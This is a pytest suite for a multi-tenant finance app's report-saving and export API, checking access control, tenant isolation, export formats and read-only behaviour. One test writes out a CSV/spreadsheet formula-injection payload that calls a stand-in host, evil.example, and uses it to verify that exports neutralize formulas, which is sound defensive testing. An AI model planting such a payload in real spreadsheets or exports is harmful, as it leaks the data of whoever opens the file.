"""CR-033 §4 — Report Studio persistence + export API guards.

Runs on the SQLite ``client`` + two-company ``seed`` fixtures (conftest). Proves:
CRUD as owner; private/company/cross-company visibility (no existence leak);
the owner-or-director edit matrix (private+stranger → 404, company+stranger → 403);
duplicate; saved-run == ad-hoc run; pdf/xlsx/csv export (+ BOM, content-types,
cross-company 404, bad-format 422); soft-delete hides; bad spec → 422; a
coming_soon metric saves + runs gracefully (null + meta.unavailable); and that
saving/running/exporting a report mutates no financial rows.
"""
import io
from datetime import date
from decimal import Decimal

from sqlalchemy import func, select

from app.constants import (
    ROLE_DIRECTOR,
    ROLE_FINANCE,
    ROLE_PROJECT_MANAGER,
    ROLE_SITE_MANAGER,
)
from app.models.client_invoice import ClientInvoice
from app.models.cost_entry import CostEntry
from app.models.report import Report

D = Decimal

SPEC_TABLE = {"metrics": ["cost_try"], "dimensions": ["project"], "viz": "table"}
SPEC_KPI = {"metrics": ["cost_try"], "viz": "kpi"}
SPEC_PROJECT = {"metrics": ["revenue", "pnl", "forecast_final"], "dimensions": ["project"]}


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def _login_director(client, seed, label="a"):
    client.login(seed[label]["users"][ROLE_DIRECTOR])
    return seed[label]["project"]


def _cost(db, p, amount, uid, d=date(2026, 1, 10)):
    amt = D(str(amount))
    db.add(CostEntry(
        project_id=p.id, company_id=p.company_id, entry_date=d, cost_category="material_steel",
        amount_try=amt, vat_amount_try=D("0"), total_with_vat_try=amt,
        payment_status="unpaid", entry_type="actual", created_by=uid,
    ))
    db.commit()


def _make_report(db, seed, label, owner_role, visibility="private", spec=None, title="Rapor"):
    """Insert a Report row directly for precise owner/visibility control."""
    owner = seed[label]["users"][owner_role]
    r = Report(
        company_id=seed[label]["company"].id,
        owner_id=owner.id,
        created_by=owner.id,
        title=title,
        spec=spec or dict(SPEC_TABLE),
        visibility=visibility,
    )
    db.add(r)
    db.commit()
    db.refresh(r)
    return r


def _count(db, model) -> int:
    db.rollback()  # drop any stale snapshot so we see rows the API committed
    return db.execute(select(func.count()).select_from(model)).scalar_one()


# --------------------------------------------------------------------------- #
# CRUD happy path (owner)
# --------------------------------------------------------------------------- #
def test_crud_happy_path_owner(client, seed):
    _login_director(client, seed, "a")

    c = client.post("/api/v1/studio/reports",
                    json={"title": "İlk Rapor", "spec": SPEC_KPI, "labels": ["maliyet"]})
    assert c.status_code == 200, c.text
    data = c.json()["data"]
    rid = data["id"]
    assert data["is_owner"] is True
    assert data["visibility"] == "private"
    assert data["labels"] == ["maliyet"]

    g = client.get(f"/api/v1/studio/reports/{rid}")
    assert g.status_code == 200 and g.json()["data"]["title"] == "İlk Rapor"

    p = client.patch(f"/api/v1/studio/reports/{rid}",
                     json={"title": "Güncel", "visibility": "company"})
    assert p.status_code == 200
    assert p.json()["data"]["title"] == "Güncel"
    assert p.json()["data"]["visibility"] == "company"

    lst = client.get("/api/v1/studio/reports").json()["data"]
    assert any(it["id"] == rid for it in lst)
    assert next(it for it in lst if it["id"] == rid)["viz"] == "kpi"

    d = client.delete(f"/api/v1/studio/reports/{rid}")
    assert d.status_code == 200 and d.json()["data"]["deleted"] is True

    # Soft-delete hides it from the list and GET → 404.
    lst2 = client.get("/api/v1/studio/reports").json()["data"]
    assert all(it["id"] != rid for it in lst2)
    assert client.get(f"/api/v1/studio/reports/{rid}").status_code == 404


# --------------------------------------------------------------------------- #
# Visibility
# --------------------------------------------------------------------------- #
def test_private_invisible_to_same_company(client, seed, db):
    rep = _make_report(db, seed, "a", ROLE_FINANCE, visibility="private", title="Gizli")

    client.login(seed["a"]["users"][ROLE_PROJECT_MANAGER])  # same company, not owner
    assert client.get(f"/api/v1/studio/reports/{rep.id}").status_code == 404
    lst = client.get("/api/v1/studio/reports").json()["data"]
    assert all(it["id"] != str(rep.id) for it in lst)

    client.login(seed["a"]["users"][ROLE_FINANCE])  # owner sees it
    assert client.get(f"/api/v1/studio/reports/{rep.id}").status_code == 200


def test_company_visible_to_all_same_company(client, seed, db):
    rep = _make_report(db, seed, "a", ROLE_FINANCE, visibility="company", title="Paylaşılan")
    for role in (ROLE_DIRECTOR, ROLE_PROJECT_MANAGER, ROLE_FINANCE, ROLE_SITE_MANAGER):
        client.login(seed["a"]["users"][role])
        r = client.get(f"/api/v1/studio/reports/{rep.id}")
        assert r.status_code == 200, f"{role}: {r.text}"


def test_cross_company_never_leaks(client, seed, db):
    for vis in ("private", "company"):
        rep = _make_report(db, seed, "a", ROLE_DIRECTOR, visibility=vis, title=f"A-{vis}")
        client.login(seed["b"]["users"][ROLE_DIRECTOR])
        assert client.get(f"/api/v1/studio/reports/{rep.id}").status_code == 404
        lst = client.get("/api/v1/studio/reports").json()["data"]
        assert all(it["id"] != str(rep.id) for it in lst)


# --------------------------------------------------------------------------- #
# Owner / director edit matrix
# --------------------------------------------------------------------------- #
def test_owner_director_edit_matrix(client, seed, db):
    rep = _make_report(db, seed, "a", ROLE_FINANCE, visibility="company", title="Şirket Raporu")
    rid = rep.id

    # PM — same company, non-owner, non-director → 403 on a COMPANY report.
    client.login(seed["a"]["users"][ROLE_PROJECT_MANAGER])
    assert client.patch(f"/api/v1/studio/reports/{rid}", json={"title": "X"}).status_code == 403
    assert client.delete(f"/api/v1/studio/reports/{rid}").status_code == 403

    # Owner (finance) → 200.
    client.login(seed["a"]["users"][ROLE_FINANCE])
    assert client.patch(f"/api/v1/studio/reports/{rid}", json={"title": "Sahip"}).status_code == 200

    # Director → 200 patch & delete (any company report).
    client.login(seed["a"]["users"][ROLE_DIRECTOR])
    assert client.patch(f"/api/v1/studio/reports/{rid}", json={"title": "Direktör"}).status_code == 200
    assert client.delete(f"/api/v1/studio/reports/{rid}").status_code == 200


def test_private_stranger_gets_404_not_403(client, seed, db):
    rep = _make_report(db, seed, "a", ROLE_FINANCE, visibility="private", title="Özel")
    client.login(seed["a"]["users"][ROLE_PROJECT_MANAGER])  # non-owner, non-director
    # A private report of another user must be INVISIBLE (404), never 403.
    assert client.patch(f"/api/v1/studio/reports/{rep.id}", json={"title": "X"}).status_code == 404
    assert client.delete(f"/api/v1/studio/reports/{rep.id}").status_code == 404


def test_cross_company_edit_is_404(client, seed, db):
    """A company-B DIRECTOR cannot edit/delete a company-A report. Pins the
    director branch of _get_editable, whose only SQLite tenant guard is
    company_id == user.company_id (no RLS in the test DB)."""
    for vis in ("private", "company"):
        rep = _make_report(db, seed, "a", ROLE_DIRECTOR, visibility=vis, title=f"A-{vis}")
        client.login(seed["b"]["users"][ROLE_DIRECTOR])  # other company's director
        assert client.patch(f"/api/v1/studio/reports/{rep.id}", json={"title": "X"}).status_code == 404
        assert client.delete(f"/api/v1/studio/reports/{rep.id}").status_code == 404
        assert client.post(f"/api/v1/studio/reports/{rep.id}/run").status_code == 404
        assert client.post(f"/api/v1/studio/reports/{rep.id}/duplicate").status_code == 404


def test_director_edits_other_users_private_report_same_company(client, seed, db):
    """Per spec 'edit/delete = owner OR director': a director may edit another
    user's PRIVATE report — but only within their own company (200, intended)."""
    rep = _make_report(db, seed, "a", ROLE_FINANCE, visibility="private", title="Birinin özeli")
    client.login(seed["a"]["users"][ROLE_DIRECTOR])  # same-company director, not owner
    assert client.patch(f"/api/v1/studio/reports/{rep.id}", json={"title": "Direktör düzenledi"}).status_code == 200
    assert client.delete(f"/api/v1/studio/reports/{rep.id}").status_code == 200


def test_patch_bad_spec_returns_422(client, seed, db):
    """update_report validates the spec independently of create."""
    rep = _make_report(db, seed, "a", ROLE_DIRECTOR, visibility="private", title="Düzenlenecek")
    client.login(seed["a"]["users"][ROLE_DIRECTOR])
    r = client.patch(f"/api/v1/studio/reports/{rep.id}", json={"spec": {"metrics": []}})
    assert r.status_code == 422
    assert r.json()["error"]["code"] == "VALIDATION_ERROR"


# --------------------------------------------------------------------------- #
# Duplicate
# --------------------------------------------------------------------------- #
def test_duplicate_creates_private_copy_owned_by_caller(client, seed, db):
    rep = _make_report(db, seed, "a", ROLE_DIRECTOR, visibility="company", title="Kaynak")
    pm = seed["a"]["users"][ROLE_PROJECT_MANAGER]
    client.login(pm)

    d = client.post(f"/api/v1/studio/reports/{rep.id}/duplicate")
    assert d.status_code == 200, d.text
    data = d.json()["data"]
    assert data["title"].endswith("(kopya)")
    assert data["visibility"] == "private"
    assert data["is_owner"] is True
    assert data["owner_id"] == str(pm.id)
    assert data["id"] != str(rep.id)
    assert data["spec"] == rep.spec


# --------------------------------------------------------------------------- #
# Saved run == ad-hoc run
# --------------------------------------------------------------------------- #
def test_run_saved_equals_adhoc(client, seed, db):
    p = _login_director(client, seed, "a")
    _cost(db, p, "120000", seed["a"]["users"][ROLE_DIRECTOR].id)

    rid = client.post("/api/v1/studio/reports",
                      json={"title": "Eşit", "spec": SPEC_TABLE}).json()["data"]["id"]

    saved = client.post(f"/api/v1/studio/reports/{rid}/run")
    adhoc = client.post("/api/v1/studio/run", json=SPEC_TABLE)
    assert saved.status_code == 200 and adhoc.status_code == 200
    sd, ad = saved.json()["data"], adhoc.json()["data"]
    for key in ("columns", "rows", "totals", "meta"):
        assert key in sd
    assert sd["columns"] == ad["columns"]
    assert sd["rows"] == ad["rows"]
    assert sd["totals"] == ad["totals"]
    assert sd["totals"]["metrics"]["cost_try"] == 120000.0


# --------------------------------------------------------------------------- #
# Export
# --------------------------------------------------------------------------- #
def test_export_formats(client, seed, db):
    p = _login_director(client, seed, "a")
    _cost(db, p, "120000", seed["a"]["users"][ROLE_DIRECTOR].id)
    rid = client.post("/api/v1/studio/reports",
                      json={"title": "Dışa Aktar", "spec": SPEC_TABLE}).json()["data"]["id"]

    pdf = client.post(f"/api/v1/studio/reports/{rid}/export?format=pdf")
    assert pdf.status_code == 200
    assert pdf.headers["content-type"].startswith("application/pdf")
    assert pdf.content[:4] == b"%PDF"

    xlsx = client.post(f"/api/v1/studio/reports/{rid}/export?format=xlsx")
    assert xlsx.status_code == 200
    assert "spreadsheetml" in xlsx.headers["content-type"]
    assert xlsx.content[:2] == b"PK"  # zip container

    csv_r = client.post(f"/api/v1/studio/reports/{rid}/export?format=csv")
    assert csv_r.status_code == 200
    assert csv_r.headers["content-type"].startswith("text/csv")
    assert csv_r.content.startswith(b"\xef\xbb\xbf")  # UTF-8 BOM for Excel/Türkçe
    assert len(csv_r.content) > 3

    bad = client.post(f"/api/v1/studio/reports/{rid}/export?format=xml")
    assert bad.status_code == 422
    assert bad.json()["error"]["code"] == "INVALID_FORMAT"


def test_export_content_carries_the_data(client, seed, db):
    """The actual computed values + Toplam row reach the file (not just the right
    magic bytes) — guards the _flat_table → xlsx/csv flatten step."""
    from openpyxl import load_workbook

    p = _login_director(client, seed, "a")
    _cost(db, p, "120000", seed["a"]["users"][ROLE_DIRECTOR].id)
    rid = client.post("/api/v1/studio/reports",
                      json={"title": "İçerik", "spec": SPEC_TABLE}).json()["data"]["id"]

    csv_text = client.post(f"/api/v1/studio/reports/{rid}/export?format=csv").content.decode("utf-8-sig")
    assert "Maliyet (₺)" in csv_text  # header label present
    assert "Toplam" in csv_text       # totals row present
    assert "120000" in csv_text       # the computed value reached the file

    xlsx = client.post(f"/api/v1/studio/reports/{rid}/export?format=xlsx")
    ws = load_workbook(io.BytesIO(xlsx.content)).active
    vals = [c for row in ws.iter_rows(values_only=True) for c in row]
    assert "Toplam" in vals
    assert 120000 in vals or 120000.0 in vals


def test_export_neutralizes_formula_injection(client, seed, db):
    """CSV / spreadsheet formula injection (covers BOTH _csv and _xlsx): a user-authored
    dimension value beginning with a formula trigger (= + - @) must be neutralized in
    both report exports — rendered as literal apostrophe-prefixed text, never a live
    formula (=WEBSERVICE / =HYPERLINK / legacy DDE)."""
    from openpyxl import load_workbook

    p = _login_director(client, seed, "a")
    uid = seed["a"]["users"][ROLE_DIRECTOR].id
    payload = '=WEBSERVICE("http://evil.example/?x="&A1)'
    db.add(CostEntry(
        project_id=p.id, company_id=p.company_id, entry_date=date(2026, 1, 10),
        cost_category=payload, amount_try=D("1000"), vat_amount_try=D("0"),
        total_with_vat_try=D("1000"), payment_status="unpaid", entry_type="actual",
        created_by=uid,
    ))
    db.commit()
    rid = client.post("/api/v1/studio/reports", json={
        "title": "Enjeksiyon",
        "spec": {"metrics": ["cost_try"], "dimensions": ["cost_category"], "viz": "table"},
    }).json()["data"]["id"]

    # CSV: the payload survives, but EVERY occurrence of the formula is apostrophe-
    # prefixed, so no field begins with a bare trigger when the file is opened.
    csv_text = client.post(f"/api/v1/studio/reports/{rid}/export?format=csv").content.decode("utf-8-sig")
    assert "'=WEBSERVICE" in csv_text
    assert csv_text.count("=WEBSERVICE") == csv_text.count("'=WEBSERVICE")

    # XLSX: the cell is literal text, never a formula.
    ws = load_workbook(io.BytesIO(
        client.post(f"/api/v1/studio/reports/{rid}/export?format=xlsx").content)).active
    cells = [c.value for row in ws.iter_rows() for c in row if isinstance(c.value, str)]
    assert any(v.startswith("'=WEBSERVICE") for v in cells)
    assert all(c.data_type != "f" for row in ws.iter_rows() for c in row)
    assert not any(v[:1] in ("=", "+", "-", "@") for v in cells)


def test_export_cross_company_404(client, seed, db):
    rep = _make_report(db, seed, "a", ROLE_DIRECTOR, visibility="company", title="A")
    client.login(seed["b"]["users"][ROLE_DIRECTOR])
    assert client.post(f"/api/v1/studio/reports/{rep.id}/export?format=pdf").status_code == 404


# --------------------------------------------------------------------------- #
# Validation + graceful coming_soon
# --------------------------------------------------------------------------- #
def test_create_bad_spec_returns_422(client, seed):
    _login_director(client, seed, "a")
    r = client.post("/api/v1/studio/reports", json={"title": "Kötü", "spec": {"metrics": []}})
    assert r.status_code == 422
    assert r.json()["error"]["code"] == "VALIDATION_ERROR"


def test_create_rejects_bad_visibility_422(client, seed):
    _login_director(client, seed, "a")
    # "team" is deferred; the Literal rejects it (Pydantic 422) before the DB.
    r = client.post("/api/v1/studio/reports",
                    json={"title": "Takım", "spec": SPEC_KPI, "visibility": "team"})
    assert r.status_code == 422


def test_coming_soon_metric_saves_and_runs_graceful(client, seed):
    _login_director(client, seed, "a")
    c = client.post("/api/v1/studio/reports", json={"title": "DSO", "spec": {"metrics": ["dso"]}})
    assert c.status_code == 200, c.text
    rid = c.json()["data"]["id"]

    run = client.post(f"/api/v1/studio/reports/{rid}/run")
    assert run.status_code == 200
    data = run.json()["data"]
    assert data["totals"]["metrics"]["dso"] is None
    assert "dso" in data["meta"]["unavailable"]


# --------------------------------------------------------------------------- #
# Read-only: no financial mutation
# --------------------------------------------------------------------------- #
def test_save_run_export_mutate_no_financial_rows(client, seed, db):
    p = _login_director(client, seed, "a")
    _cost(db, p, "50000", seed["a"]["users"][ROLE_DIRECTOR].id)

    cost_before = _count(db, CostEntry)
    inv_before = _count(db, ClientInvoice)
    rep_before = _count(db, Report)

    rid = client.post("/api/v1/studio/reports",
                      json={"title": "Mutasyon Yok", "spec": SPEC_TABLE}).json()["data"]["id"]
    assert client.post(f"/api/v1/studio/reports/{rid}/run").status_code == 200
    assert client.post(f"/api/v1/studio/reports/{rid}/export?format=csv").status_code == 200

    assert _count(db, CostEntry) == cost_before
    assert _count(db, ClientInvoice) == inv_before
    assert _count(db, Report) == rep_before + 1  # exactly one new reports row


def test_no_mutation_project_grain_spec(client, seed, db):
    """A project-grain spec (revenue/pnl/forecast) exercises the heavier
    revenue-model-aware services (project_pnl/forecast_at_completion/cashflow) —
    still zero financial writes."""
    p = _login_director(client, seed, "a")
    _cost(db, p, "80000", seed["a"]["users"][ROLE_DIRECTOR].id)

    cost_before = _count(db, CostEntry)
    inv_before = _count(db, ClientInvoice)
    rep_before = _count(db, Report)

    rid = client.post("/api/v1/studio/reports",
                      json={"title": "Proje grain", "spec": SPEC_PROJECT}).json()["data"]["id"]
    assert client.post(f"/api/v1/studio/reports/{rid}/run").status_code == 200
    assert client.post(f"/api/v1/studio/reports/{rid}/export?format=xlsx").status_code == 200

    assert _count(db, CostEntry) == cost_before
    assert _count(db, ClientInvoice) == inv_before
    assert _count(db, Report) == rep_before + 1
